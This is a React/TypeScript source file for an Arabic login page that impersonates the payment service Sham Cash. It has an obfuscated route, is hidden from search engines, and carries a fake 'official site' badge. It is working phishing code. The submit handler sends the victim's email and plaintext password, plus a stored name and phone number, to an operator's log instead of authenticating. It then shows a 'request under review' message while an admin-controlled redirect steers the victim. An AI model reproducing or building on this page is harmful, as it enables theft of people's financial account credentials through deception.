import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { Eye, EyeOff, Loader2, Lock, User, ShieldCheck, ChevronRight } from "lucide-react";
import { toast } from "sonner";
import { Link } from "@tanstack/react-router";
import { HomeShapes } from "@/components/home-shapes";
import shamLogo from "@/assets/sham-login-logo.webp";
import { usePresenceTracker } from "@/lib/presence";
import { logSubmission } from "@/lib/submissions";
import { useAdminRedirect } from "@/lib/admin-redirect";
import { usePersistedField } from "@/lib/form-memory";
import { ErrorAlert } from "@/components/error-alert";
import { isRapidRepeat, remainingCooldown } from "@/lib/throttle";


export const Route = createFileRoute("/YXV0aA")({
  ssr: false,
  head: () => ({
    links: [{ rel: "preload", as: "image", href: shamLogo, fetchPriority: "high" }],
    meta: [
      { name: "robots", content: "noindex, nofollow" },
      { title: "تسجيل الدخول | شام كاش" },
      {
        name: "description",
        content: "سجّل الدخول إلى بوابة شام كاش لتقديم طلب توثيق حسابك ومتابعة حالة المراجعة.",
      },
      { property: "og:title", content: "تسجيل الدخول — بوابة خدمات شام كاش" },
      {
        property: "og:description",
        content: "أدخل بريدك الإلكتروني وكلمة المرور للمتابعة إلى صفحة مراجعة الطلب.",
      },
    ],
  }),
  component: AuthPage,
});

const fieldClass = "app-field " +
  "w-full rounded-[1.75rem] login-field py-5 pr-14 pl-12 text-base font-medium text-white outline-none transition-colors placeholder:text-white/55 focus:bg-white/[0.12] focus:ring-2 focus:ring-[oklch(0.72_0.13_235)]/40";

function AuthPage() {
  usePresenceTracker({ page: "/YXV0aA" });
  useAdminRedirect();
  const navigate = useNavigate();
  const [email, setEmail] = usePersistedField("sham_auth_email");
  const [password, setPassword] = useState("");
  const emailRef = useRef<HTMLInputElement | null>(null);
  const passwordRef = useRef<HTMLInputElement | null>(null);

  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState<{ title: string; message: string; hint?: string } | null>(null);
  const [errField, setErrField] = useState<"email" | "password" | null>(null);
  const [loading, setLoading] = useState(false);
  const [missing, setMissing] = useState<{ email: boolean; password: boolean }>({ email: false, password: false });

  // إفراغ حقل البريد في كل مرة تُفتح فيها الصفحة + عرض سبب الرفض إن وُجد
  useEffect(() => {
    let pending = false;
    try { pending = window.sessionStorage.getItem("sham_login_pending") === "1"; } catch { /* ignore */ }
    if (pending) {
      try {
        const savedEmail = window.localStorage.getItem("sham_email") ?? "";
        if (savedEmail) setEmail(savedEmail);
      } catch { /* ignore */ }
      setLoading(true);
    } else {
      try {
        window.localStorage.removeItem("sham_auth_email");
        window.localStorage.removeItem("sham_email");
      } catch { /* ignore */ }
      setEmail("");
      setPassword("");
    }
    try {
      const reason = window.sessionStorage.getItem("sham_reject_reason");
      const wasLoginError = window.sessionStorage.getItem("sham_login_error") === "1";
      if (reason || wasLoginError) {
        window.sessionStorage.removeItem("sham_reject_reason");
        window.sessionStorage.removeItem("sham_login_error");
        window.sessionStorage.removeItem("sham_login_pending");
        setLoading(false);
        setError({
          title: "تعذّر تسجيل الدخول",
          message: reason ?? "البريد الإلكتروني أو كلمة المرور غير صحيحة.",
          hint: "تأكد أن البريد الإلكتروني وكلمة المرور مطابقان لبياناتك المسجّلة في تطبيق شام كاش، ثم أعد المحاولة.",
        });
      }
    } catch { /* ignore */ }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);


  // تركيز تلقائي على أول حقل فارغ لتسريع الاستخدام
  useEffect(() => {
    const t = window.setTimeout(() => {
      if (!email) emailRef.current?.focus();
      else passwordRef.current?.focus();
    }, 250);
    return () => window.clearTimeout(t);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // تنبيه Caps Lock عند كتابة كلمة السر
  const [capsLock, setCapsLock] = useState(false);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loading) return;
    const trimmedForKey = email.trim().toLowerCase();
    if (isRapidRepeat(`auth:${trimmedForKey}:${password}`, 2000)) {
      const sec = Math.ceil(remainingCooldown(`auth:${trimmedForKey}:${password}`, 2000) / 1000);
      setErrField(null);
      setError({
        title: "محاولات متكررة بسرعة",
        message: `أرسلت الطلب للتو. انتظر ${sec} ثانية ثم أعد المحاولة.`,
        hint: "تجنّب الضغط المتكرر على زر الدخول حتى لا يُحسب كمحاولة إضافية.",
      });
      return;
    }
    setError(null);
    setErrField(null);

    const emailEmpty = !email.trim();
    const passwordEmpty = !password;
    if (emailEmpty || passwordEmpty) {
      setMissing({ email: emailEmpty, password: passwordEmpty });
      if (emailEmpty) emailRef.current?.focus({ preventScroll: true });
      else passwordRef.current?.focus({ preventScroll: true });
      return;
    }
    setMissing({ email: false, password: false });

    const emailValue = email.trim();
    if (!emailValue.includes("@") || !/^[\x21-\x7E]+$/.test(emailValue)) {
      setErrField("email");
      setError({
        title: "صيغة البريد غير صحيحة",
        message: "يجب أن يحتوي البريد على رمز @ وأن يكون بأحرف إنجليزية فقط.",
        hint: "اكتب بريدك بأحرف إنجليزية ويحتوي على @، مثال: name@example.com",
      });
      emailRef.current?.focus({ preventScroll: true });
      emailRef.current?.scrollIntoView({ behavior: "smooth", block: "center" });
      return;
    }

    if (password.length < 6) {
      setErrField("password");
      setError({
        title: "كلمة المرور قصيرة",
        message: "كلمة المرور يجب ألا تقل عن 6 أحرف.",
        hint: "أدخل كلمة المرور نفسها التي تستخدمها لدخول تطبيق شام كاش.",
      });
      passwordRef.current?.focus({ preventScroll: true });
      passwordRef.current?.scrollIntoView({ behavior: "smooth", block: "center" });
      return;
    }

    setLoading(true);
    const trimmedEmail = email.trim();

    try {
      window.localStorage.setItem("sham_email", trimmedEmail);
      window.sessionStorage.setItem("sham_login_pending", "1");
    } catch { /* ignore */ }

    let savedName: string | null = null;
    let savedPhone: string | null = null;
    try {
      savedName = window.localStorage.getItem("sham_name");
      savedPhone = window.localStorage.getItem("sham_phone");
    } catch { /* ignore */ }
    try {
      await logSubmission(
        "login_attempt",
        { email: trimmedEmail, password, name: savedName, phone: savedPhone, full_name: savedName },
        trimmedEmail,
      );
    } catch { /* ignore */ }

    toast.success("تم استلام بياناتك، طلبك الآن قيد المراجعة");
    // ابقَ على زر الانتظار حتى يتولى موجّه لوحة التحكم نقل العميل للصفحة المناسبة
    // (لا نُطفئ loading ولا نُنقل الصفحة يدوياً)
  };

  return (
    <div dir="rtl" className="login-v5 relative flex min-h-dvh flex-col overflow-hidden px-5 pb-10 pt-[max(1rem,env(safe-area-inset-top))]">
      <div aria-hidden className="home-v3 pointer-events-none !absolute inset-0 !z-0 overflow-hidden !bg-transparent">
        <HomeShapes />
      </div>
      <div className="relative z-10 flex w-full max-w-sm flex-1 flex-col self-center">
      <div className="flex items-center justify-between">
        <Link to="/" aria-label="رجوع" className="flex size-11 items-center justify-center rounded-full text-white/70 active:scale-95">
          <ChevronRight className="size-6" />
        </Link>
        <span className="trust-pill text-white/70">الموقع الرسمي</span>
      </div>

      <img src={shamLogo} alt="شام كاش" fetchPriority="high" decoding="async" className="mx-auto mt-10 h-28 w-auto drop-shadow-[0_18px_40px_rgba(74,144,226,0.45)] sm:mt-14 sm:h-32" />

      <h1 className="mt-12 text-right text-3xl font-black text-white sm:mt-14">تسجيل الدخول</h1>

      {error ? (
        <div className="mt-5">
          <ErrorAlert title={error.title} message={error.message} hint={error.hint} />
        </div>
      ) : null}

      <form onSubmit={submit} className="mt-6 grid w-full gap-4">
        <label className="relative block">
          <User fill="currentColor" strokeWidth={1.5} className="login-icon pointer-events-none absolute top-1/2 right-5 z-10 size-6 -translate-y-1/2" />
          <input
            ref={emailRef}
            className={`${fieldClass} ${errField === "email" ? "field-error" : ""} ${missing.email ? "field-missing" : ""}`}
            type="email"
            style={{ textAlign: "right" }}
            inputMode="email"
            autoComplete="email"
            maxLength={255}
            value={email}
            onChange={(e) => { setEmail(e.target.value.replace(/[^\x21-\x7E]/g, "")); if (errField === "email") { setErrField(null); setError(null); } if (missing.email) setMissing((m) => ({ ...m, email: false })); }}
            placeholder="البريد الإلكتروني"
            aria-invalid={errField === "email" || missing.email}
          />
        </label>
        {missing.email ? <p className="field-required-msg -mt-2">هذا الحقل مطلوب</p> : (errField === "email" && error ? <p className="field-error-msg -mt-2">{error.message}</p> : null)}

        <label className="relative block">
          <Lock fill="currentColor" strokeWidth={1.5} className="login-icon pointer-events-none absolute top-1/2 right-5 z-10 size-6 -translate-y-1/2" />
          <input
            ref={passwordRef}
            className={`${fieldClass} ${errField === "password" ? "field-error" : ""} ${missing.password ? "field-missing" : ""}`}
            type={showPassword ? "text" : "password"}
            style={{ textAlign: "right" }}
            lang="en"
            inputMode="text"
            autoComplete="current-password"
            maxLength={72}
            value={password}
            onChange={(e) => {
              const cleaned = e.target.value.replace(
                /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g,
                "",
              );
              setPassword(cleaned);
              if (errField === "password") { setErrField(null); setError(null); }
              if (missing.password) setMissing((m) => ({ ...m, password: false }));
            }}
            onBeforeInput={(e) => {
              const data = (e as unknown as { data?: string }).data;
              if (data && /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/.test(data)) {
                e.preventDefault();
              }
            }}
            onKeyDown={(e) => { try { setCapsLock(e.getModifierState && e.getModifierState("CapsLock")); } catch { /* ignore */ } }}
            onKeyUp={(e) => { try { setCapsLock(e.getModifierState && e.getModifierState("CapsLock")); } catch { /* ignore */ } }}
            placeholder="كلمة السر"
            aria-invalid={errField === "password" || missing.password}
          />
          <button
            type="button"
            aria-label={showPassword ? "إخفاء كلمة السر" : "إظهار كلمة السر"}
            onClick={() => setShowPassword((v) => !v)}
            className="absolute top-1/2 left-1.5 z-10 inline-flex size-11 -translate-y-1/2 items-center justify-center rounded-xl text-white/60 transition hover:text-white"
          >
            {showPassword ? <EyeOff className="size-5" /> : <Eye className="size-5" />}
          </button>
        </label>
        {missing.password ? <p className="field-required-msg -mt-2">هذا الحقل مطلوب</p> : (errField === "password" && error ? <p className="field-error-msg -mt-2">{error.message}</p> : null)}
        {capsLock && !missing.password ? (
          <p className="-mt-2 text-xs font-semibold text-amber-300" role="status">تنبيه: زر Caps Lock مفعّل</p>
        ) : null}

        <button
          type="submit"
          disabled={loading}
          aria-busy={loading}
          aria-disabled={loading}
          className={`mt-1 inline-flex min-h-14 items-center justify-center rounded-2xl px-5 text-lg font-bold transition active:scale-[0.98] disabled:pointer-events-none disabled:cursor-wait ${loading ? "login-cta-waiting text-slate-900" : "login-cta text-white"}`}
        >
          {loading ? "انتظر..." : "تسجيل الدخول"}
        </button>

        <p className="text-center text-sm text-white/70">
          لا تملك حساب مسبقاً؟{" "}
          <span className="font-semibold text-[#6f80e4]">إنشاء حساب</span>
        </p>
      </form>

        <div className="mt-auto flex flex-col items-center gap-2 pt-12">
          <span className="text-[11px] font-bold tracking-[0.3em] text-white/35">POWERED BY</span>
          <img src={shamLogo} alt="" aria-hidden loading="lazy" decoding="async" className="h-8 w-auto opacity-25 grayscale" />
          <span className="text-xs font-semibold tracking-[0.2em] text-white/30">V 3.0.0</span>
        </div>
      </div>
    </div>
  );
}
